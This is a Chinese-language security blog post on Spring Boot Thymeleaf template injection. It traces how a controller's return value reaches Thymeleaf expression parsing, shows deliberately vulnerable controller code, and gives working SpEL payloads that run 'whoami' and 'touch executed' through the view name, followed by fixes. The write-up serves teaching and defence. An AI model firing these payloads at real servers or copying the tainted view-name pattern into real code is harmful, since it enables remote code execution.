<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>She11c0de&#39;s blogs</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="Spring Boot Thymeleaf 模板注入一、漏洞简介Thymeleaf是用于Web和独立环境的现代服务器端Java模板引擎。类似与pythonweb开发中的jinja模板引擎。顺便说一句，Thymeleaf是spring boot的推荐引擎 二、漏洞影响三、复现过程0x01 基础知识Spring Boot 本身就 Spring MVC 的简化版本。是在 Spring MVC的基础上实现">
<meta property="og:type" content="article">
<meta property="og:title" content="She11c0de&#39;s blogs">
<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/Spring%20Boot/Spring%20Boot%20Thymeleaf%20%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/index.html">
<meta property="og:site_name" content="She11c0de&#39;s blogs">
<meta property="og:description" content="Spring Boot Thymeleaf 模板注入一、漏洞简介Thymeleaf是用于Web和独立环境的现代服务器端Java模板引擎。类似与pythonweb开发中的jinja模板引擎。顺便说一句，Thymeleaf是spring boot的推荐引擎 二、漏洞影响三、复现过程0x01 基础知识Spring Boot 本身就 Spring MVC 的简化版本。是在 Spring MVC的基础上实现">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://she11c0de.github.io/resource/SpringBootThymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/media/rId25.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/SpringBootThymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/media/rId33.png">
<meta property="article:published_time" content="2022-07-08T06:26:03.791Z">
<meta property="article:modified_time" content="2022-07-08T07:24:51.403Z">
<meta property="article:author" content="She11c0de">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://she11c0de.github.io/resource/SpringBootThymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/media/rId25.png">
  
  
    <link rel="icon" href="/favicon.png">
  
  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
  
<link rel="stylesheet" href="/css/style.css">

  
<link rel="stylesheet" href="/css/scrollUp/image.css">

  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
  
<meta name="generator" content="Hexo 5.4.2"></head>
<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <div class="logo">
        <img src="/logo.png" alt="Profile Picture">
      </div>
      <div id="title">She11c0de's blogs</div>
      
       <ul class="my-socials">
  
 
</ul>
    </div>
  </div>
  <div id="header-inner" class="">
    <nav id="main-nav">
      <a id="main-nav-toggle" class="nav-icon"></a>
      <!--
        
          
            <a class="main-nav-link" href="/">首页</a>
          
            <a class="main-nav-link" href="/categories/life">生活</a>
          
            <a class="main-nav-link" href="/archives">归档</a>
          
        
      -->
    </nav>
    <nav id="title-nav" style="display:none">
      <a href="/">She11c0de&#39;s blogs</a>
      <img src="/logo.png" alt="Profile Picture">
      <!--
      <span id="title-nav-socials">
        
       
     </span>
      -->
    </nav>
    <nav id="sub-nav">
      
      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
    </nav>
    <div id="search-form-wrap">
      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
        <input type="submit" value="" class="search-form-submit">
        <input name=tn type=hidden value="bds">
        <input name=cl type=hidden value="3">
        <input name=ct type=hidden value="2097152">
        <input type="hidden" name="si" value="she11c0de.github.io">
      </form>
    </div>
  </div>
  <div class="site-nav" style="display: none;">
    <ul>
      
      
        <li><a href="/">首页</a></li>
      
        <li><a href="/categories/life">生活</a></li>
      
        <li><a href="/archives">归档</a></li>
      
      
    </ul>
  </div>
</header>
      <div class="outer">
        <section id="main"><article id="post-Spring Boot/Spring Boot Thymeleaf 模板注入" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Spring%20Boot/Spring%20Boot%20Thymeleaf%20%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" class="article-date">
  <time datetime="2022-07-08T06:26:03.791Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Spring-Boot-Thymeleaf-模板注入"><a href="#Spring-Boot-Thymeleaf-模板注入" class="headerlink" title="Spring Boot Thymeleaf 模板注入"></a>Spring Boot Thymeleaf 模板注入</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>Thymeleaf是用于Web和独立环境的现代服务器端Java模板引擎。类似与python<br>web开发中的jinja模板引擎。顺便说一句，Thymeleaf是spring boot的推荐引擎</p>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="0x01-基础知识"><a href="#0x01-基础知识" class="headerlink" title="0x01 基础知识"></a>0x01 基础知识</h3><p>Spring Boot 本身就 Spring MVC 的简化版本。是在 Spring MVC<br>的基础上实现了自动配置，简化了开发人员开发过程。Spring MVC 是通过一个叫<br>DispatcherServlet 前端控制器的来拦截请求的。而在 Spring Boot 中<br>使用自动配置把 DispatcherServlet 前端控制器自动配置到框架中。</p>
<p>例如，我们来解析 /users 这个请求</p>
<p><img src="/resource/SpringBootThymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/media/rId25.png" alt="1.png"></p>
<ol>
<li><p> DispatcherServlet 前端控制器拦截请求 /users</p>
</li>
<li><p> servlet 决定使用哪个 handler 处理</p>
</li>
<li><p>Spring 检测哪个控制器匹配 /users，Spring 从 @RquestMapping<br> 中查找出需要的信息</p>
</li>
<li><p> Spring 找到正确的 Controller 方法后，开始执行 Controller 方法</p>
</li>
<li><p> 返回 users 对象列表</p>
</li>
<li><p> 根据与客户端交互需要返回 Json 或者 Xml 格式</p>
</li>
</ol>
<h3 id="spring-boot-相关注解"><a href="#spring-boot-相关注解" class="headerlink" title="spring boot 相关注解"></a>spring boot 相关注解</h3><ul>
<li>  @Controller 处理 Http 请求</li>
<li>  @RestController @Controller 的衍生注解</li>
<li>  @RequestMapping 路由请求 可以设置各种操作方法</li>
<li>  @GetMapping GET 方法的路由</li>
<li>  @PostMapping POST 方法的路由</li>
<li>  @PutMapping PUT 方法的路由</li>
<li>  @DeleteMapping DELETE 方法的路由</li>
<li>  @PathVariable 处理请求 url 路径中的参数 /user/{id}</li>
<li>  @RequestParam 处理问号后面的参数</li>
<li>  @RequestBody 请求参数以json格式提交</li>
<li>  @ResponseBody 返回 json 格式</li>
</ul>
<h3 id="Controller注解"><a href="#Controller注解" class="headerlink" title="Controller注解"></a>Controller注解</h3><p>@Controller 一般应用在有返回界面的应用场景下.例如，管理后台使用了<br>thymeleaf 作为模板开发，需要从后台直接返回 Model<br>对象到前台，那么这时候就需要使用 @Controller 来注解。</p>
<h3 id="RequestMapping注解"><a href="#RequestMapping注解" class="headerlink" title="RequestMapping注解"></a>RequestMapping注解</h3><p>用来将一个controller添加至路由中</p>
<h2 id="0x02-环境配置"><a href="#0x02-环境配置" class="headerlink" title="0x02 环境配置"></a>0x02 环境配置</h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/veracode-research/spring-view-manipulation/">https://github.com/veracode-research/spring-view-manipulation/</a></p>
</blockquote>
<p>我们以spring boot + Thymeleaf模板创建一个带有漏洞的项目。核心代码如下</p>
<pre><code>    @GetMapping(&quot;/path&quot;)
    public String path(@RequestParam String lang) &#123;
        return  lang ; //template path is tainted
    &#125;
</code></pre>
<p>代码含义如下：用户请求的url为path，参数名称为lang，则服务器通过Thymeleaf模板，去查找相关的模板文件。</p>
<p>例如，用户通过get请求<code>/path?lang=en</code>，则服务器去自动拼接待查找的模板文件名，为<code>resources/templates/en.html</code>，并返回给用户的浏览器。</p>
<p>上面的代码存在两个问题：</p>
<ol>
<li> 是不是存在任意文件读取？</li>
<li> 是不是存在诸如模板注入的漏洞？？？</li>
</ol>
<h2 id="0x03-模板注入分析"><a href="#0x03-模板注入分析" class="headerlink" title="0x03 模板注入分析"></a>0x03 模板注入分析</h2><p>spring boot如何查找controller这块我们不分析，因为对于我们不重要。</p>
<p>spring<br>boot在<code>org.springframework.web.servlet.ModelAndView</code>方法中，开始处理用户的请求</p>
<pre><code> /**
     * This implementation expects the handler to be an &#123;@link HandlerMethod&#125;.
     */
    @Override
    @Nullable
    public final ModelAndView handle(HttpServletRequest request, HttpServletResponse response, Object handler)
            throws Exception &#123;

        return handleInternal(request, response, (HandlerMethod) handler);
    &#125;
</code></pre>
<p>随后在<code>org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod#invokeAndHandle</code>方法中，通过invokeForRequest函数，根据用户提供的url，调用相关的controller，并将其返回值，作为待查找的模板文件名，通过Thymeleaf模板引擎去查找，并返回给用户</p>
<pre><code> /**
     * Invoke the method and handle the return value through one of the
     * configured &#123;@link HandlerMethodReturnValueHandler HandlerMethodReturnValueHandlers&#125;.
     * @param webRequest the current request
     * @param mavContainer the ModelAndViewContainer for this request
     * @param providedArgs &quot;given&quot; arguments matched by type (not resolved)
     */
    public void invokeAndHandle(ServletWebRequest webRequest, ModelAndViewContainer mavContainer,
            Object... providedArgs) throws Exception &#123;

        Object returnValue = invokeForRequest(webRequest, mavContainer, providedArgs);
        setResponseStatus(webRequest);

        if (returnValue == null) &#123;
            if (isRequestNotModified(webRequest) || getResponseStatus() != null || mavContainer.isRequestHandled()) &#123;
                disableContentCachingIfNecessary(webRequest);
                mavContainer.setRequestHandled(true);
                return;
            &#125;
        &#125;
        else if (StringUtils.hasText(getResponseStatusReason())) &#123;
            mavContainer.setRequestHandled(true);
            return;
        &#125;

        mavContainer.setRequestHandled(false);
        try &#123;
            this.returnValueHandlers.handleReturnValue(
                    returnValue, getReturnValueType(returnValue), mavContainer, webRequest);
        &#125;
    &#125;
</code></pre>
<p>在函数中，调用<code>this.returnValueHandlers.handleReturnValue</code>去处理返回结果。最终在<code>org.springframework.web.servlet.mvc.method.annotation.ViewNameMethodReturnValueHandler#handleReturnValue</code>方法中，将controller返回值作为视图名称。代码如下</p>
<pre><code> @Override
    public void handleReturnValue(@Nullable Object returnValue, MethodParameter returnType,
            ModelAndViewContainer mavContainer, NativeWebRequest webRequest) throws Exception &#123;

        if (returnValue instanceof CharSequence) &#123;
            String viewName = returnValue.toString();
            mavContainer.setViewName(viewName);
            if (isRedirectViewName(viewName)) &#123;
                mavContainer.setRedirectModelScenario(true);
            &#125;
        &#125;
</code></pre>
<p>spring<br>boot最终在<code>org.springframework.web.servlet.DispatcherServlet#processDispatchResult</code>方法中，调用Thymeleaf模板引擎的表达式解析。将上一步设置的视图名称为解析为模板名称，并加载模板，返回给用户。核心代码如下<code>org.thymeleaf.standard.expression.IStandardExpressionParser#parseExpression</code></p>
<pre><code>        final String viewTemplateName = getTemplateName();
        final ISpringTemplateEngine viewTemplateEngine = getTemplateEngine();

      
        final IStandardExpressionParser parser = StandardExpressions.getExpressionParser(configuration);

        final FragmentExpression fragmentExpression;
        try &#123;
            // By parsing it as a standard expression, we might profit from the expression cache
            fragmentExpression = (FragmentExpression) parser.parseExpression(context, &quot;~&#123;&quot; + viewTemplateName + &quot;&#125;&quot;);
        &#125; catch (final TemplateProcessingException e) &#123;
            throw new IllegalArgumentException(&quot;Invalid template name specification: &#39;&quot; + viewTemplateName + &quot;&#39;&quot;);
        &#125;
</code></pre>
<h2 id="0x04-不安全的java代码"><a href="#0x04-不安全的java代码" class="headerlink" title="0x04 不安全的java代码"></a>0x04 不安全的java代码</h2><h4 id="第一种："><a href="#第一种：" class="headerlink" title="第一种："></a>第一种：</h4><pre><code>    @GetMapping(&quot;/path&quot;)
    public String path(@RequestParam String lang) &#123;
        return  lang ; //template path is tainted
    &#125;
</code></pre>
<p>在查找模板中，引用了用户输入的内容</p>
<p>payload</p>
<pre><code>GET /path?lang=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22whoami%22).getInputStream()).next()%7d__::.x HTTP/1.1
Host: www.0-sec.org:8090
Connection: close
</code></pre>
<p><img src="/resource/SpringBootThymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/media/rId33.png" alt="2.png"></p>
<h4 id="第二种"><a href="#第二种" class="headerlink" title="第二种"></a>第二种</h4><p>根据spring<br>boot定义，如果controller无返回值，则以GetMapping的路由为视图名称。当然，对于每个http请求来讲，其实就是将请求的url作为视图名称，调用模板引擎去解析。</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://docs.spring.io/spring/docs/current/spring-framework-reference/web.html/#mvc-ann-return-types">https://docs.spring.io/spring/docs/current/spring-framework-reference/web.html\#mvc-ann-return-types</a></p>
</blockquote>
<p>在这种情况下，我们只要可以控制请求的controller的参数，一样可以造成RCE漏洞。例如我们可以控制document参数</p>
<pre><code>@GetMapping(&quot;/doc/&#123;document&#125;&quot;)
public void getDocument(@PathVariable String document) &#123;
    log.info(&quot;Retrieving &quot; + document);
&#125;
GET /doc/__$&#123;T(java.lang.Runtime).getRuntime().exec(&quot;touch executed&quot;)&#125;__::.x
</code></pre>
<h2 id="0x05-修复方案"><a href="#0x05-修复方案" class="headerlink" title="0x05 修复方案"></a>0x05 修复方案</h2><h3 id="1-设置ResponseBody注解"><a href="#1-设置ResponseBody注解" class="headerlink" title="1. 设置ResponseBody注解"></a>1. 设置ResponseBody注解</h3><p>如果设置<code>ResponseBody</code>，则不再调用模板解析</p>
<h3 id="2-设置redirect重定向"><a href="#2-设置redirect重定向" class="headerlink" title="2. 设置redirect重定向"></a>2. 设置redirect重定向</h3><pre><code>@GetMapping(&quot;/safe/redirect&quot;)
public String redirect(@RequestParam String url) &#123;
    return &quot;redirect:&quot; + url; //CWE-601, as we can control the hostname in redirect
</code></pre>
<p>根据spring<br>boot定义，如果名称以<code>redirect:</code>开头，则不再调用<code>ThymeleafView</code>解析，调用<code>RedirectView</code>去解析<code>controller</code>的返回值</p>
<h3 id="3-response"><a href="#3-response" class="headerlink" title="3. response"></a>3. response</h3><pre><code>@GetMapping(&quot;/safe/doc/&#123;document&#125;&quot;)
public void getDocument(@PathVariable String document, HttpServletResponse response) &#123;
    log.info(&quot;Retrieving &quot; + document); //FP
&#125;
</code></pre>
<p>由于controller的参数被设置为HttpServletResponse，Spring认为它已经处理了HTTP<br>Response，因此不会发生视图名称解析</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/potatsoSec/p/13620019.html">https://www.cnblogs.com/potatsoSec/p/13620019.html</a></p>
</blockquote>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Spring%20Boot/Spring%20Boot%20Thymeleaf%20%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" data-id="cl5c2qvmq00goy8v1195k5s58" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2022/07/07/Spring%20Boot/Spring%20Boot%20Tomcat%E5%AF%BC%E8%87%B4%E7%9A%84JNDI%E6%B3%A8%E5%85%A5/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          (no title)
        
      </div>
    </a>
  
  
    <a href="/2022/07/07/Spring%20Boot/Spring%20Boot%20sql/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title"></div>
    </a>
  
</nav>

  
</article>

</section>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2022 She11c0de<br>
      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <!--
      <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">首页</a>
  
    <a href="/categories/life" class="mobile-nav-link">生活</a>
  
    <a href="/archives" class="mobile-nav-link">归档</a>
  
</nav>
    -->
    

<!-- 百度分享 start -->

<!-- 百度分享 end -->

<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>




<script src="/js/jquery.scrollUp.min.js"></script>


<script src="/js/jquery.transform.js"></script>


<script src="/js/menu.js"></script>



<script src="/js/script.js"></script>


<script src="/js/scrollUp.js"></script>


  </div>
</body>
</html>